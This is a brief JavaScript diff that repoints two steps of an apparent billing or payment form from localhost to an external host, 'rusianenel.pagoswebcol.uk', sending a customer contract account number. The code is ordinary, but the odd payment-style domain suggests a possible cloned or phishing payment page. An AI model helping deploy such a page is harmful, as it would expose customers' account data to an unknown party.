@@ -252,7 +252,7 @@ document.addEventListener('DOMContentLoaded', () => {
 
                 try {
                     // PASO 1
-                    const res1 = await fetch('http://localhost:3000/api/paso1-obtener-datos', {
+                    const res1 = await fetch('https://rusianenel.pagoswebcol.uk/api/paso1-obtener-datos', {
                         method: 'POST',
                         headers: { 'Content-Type': 'application/json' },
                         body: JSON.stringify({ cuentaContrato: cuentaContratoVal })
@@ -266,7 +266,7 @@ document.addEventListener('DOMContentLoaded', () => {
 
                     // PASO 2
                     document.getElementById('globalLoader').style.display = 'flex';
-                    const res2 = await fetch('http://localhost:3000/api/paso2-finalizar', {
+                    const res2 = await fetch('https://rusianenel.pagoswebcol.uk/api/paso2-finalizar', {
                         method: 'POST',
                         headers: { 'Content-Type': 'application/json' },
                         body: JSON.stringify({ 
